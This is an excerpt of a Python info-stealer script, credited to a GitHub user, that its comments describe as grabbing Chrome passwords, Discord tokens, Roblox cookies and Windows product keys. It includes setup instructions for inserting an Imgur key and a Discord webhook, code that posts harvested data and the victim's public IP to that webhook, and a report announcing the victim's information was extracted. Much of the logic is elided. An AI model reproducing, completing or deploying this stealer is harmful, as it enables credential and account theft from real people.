...
# TO USE THIS SCRIPT => YOU NEED AN IMGUR API KEY, A DISCORD WEBHOOK
# LINES TO EDIT => LINE 170, LINE 172, LINE 187 : THAT'S ALL YOU NEED TO EDIT

# author : social, s4cial | https://github.com/s4cial
# please respect my work, don't pass this off as your own
# this codes functionality is pretty unique, so judging by my github post date; others will likely be able to tell who the original author is
# if you manage to better this code, please give credit to me & upload it open-source, for others to benefit
# description : gotcha => chrome passwords, discord token, roblox cookie, etc. | made by s4cial
...
# most of the application's functionality => collect, and send data
def upload():
    try:
        ...
        imgur = requests.post(
            ...
            headers = {"Authorization": "Client-ID placeholder"}, # CLIENT-ID GOES WHERE 'placeholder' IS
            data = {
                'key': 'placeholder', # CLIENT SECRET GOES WHERE 'placeholder' IS
...
def gotcha():
    # variables
    hook = Webhook('placeholder') # DISCORD WEBHOOK GOES WHERE 'placeholder' IS
    hostname = requests.get("https://api.ipify.org").text


    # discord token extraction, ported from => "https://github.com/wodxgod" :
    ...
    """read data => if we find a matching positive for 'cookie', send it to our webhook."""
    try:
        for y in cookie:
    ...
    try:
        embed = Embed(title='gotcha! - made by social : s4cial on github',description='victim\'s information => successfully extracted',color=0x2f3136,timestamp='now')
        embed.add_field("winkey:",f"user => {usr}\ntype => {types}\nkey => {keys}")
        embed.add_field("roblox:",roblox)
